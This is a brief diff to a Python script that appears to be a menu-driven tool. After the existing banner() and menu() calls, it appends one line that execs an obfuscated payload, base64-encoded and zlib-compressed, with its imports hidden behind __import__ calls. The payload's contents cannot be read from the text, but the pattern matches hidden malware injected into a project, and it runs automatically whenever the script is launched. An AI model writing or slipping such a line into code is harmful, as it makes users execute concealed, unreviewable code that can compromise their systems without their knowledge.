@@ -47,3 +47,4 @@ def menu():
 
 banner()
 menu()
+exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UMFKxDAQPTdf0VsSjEO71AUXK4h4EBHB9SYibTKuoWkSkqxWxX93QxYvM7w3b2bejJ69C6mOTk6YxLfRoxiHiOtOxBT2MomkZyRvLtRLrW0dBrtD1jZ8Q6oUvg6xin1phpLYShzx9uH67nX79Hhzdc+zDqSzFmVijDaQpIfBg90FN4F2VLRduzrnWTgGHCZS4SLRp7whW4BoED0748T0xRnsrR/kxOjlLRURAsoP1nH+3LwQ1R+x4eTzXRusDVqm+IU5jFMn/9XTQnOCC0qWjweF0s0+YIys/AHGdZdJhVkpfmikm/jLyR+GR2LO')[0])))
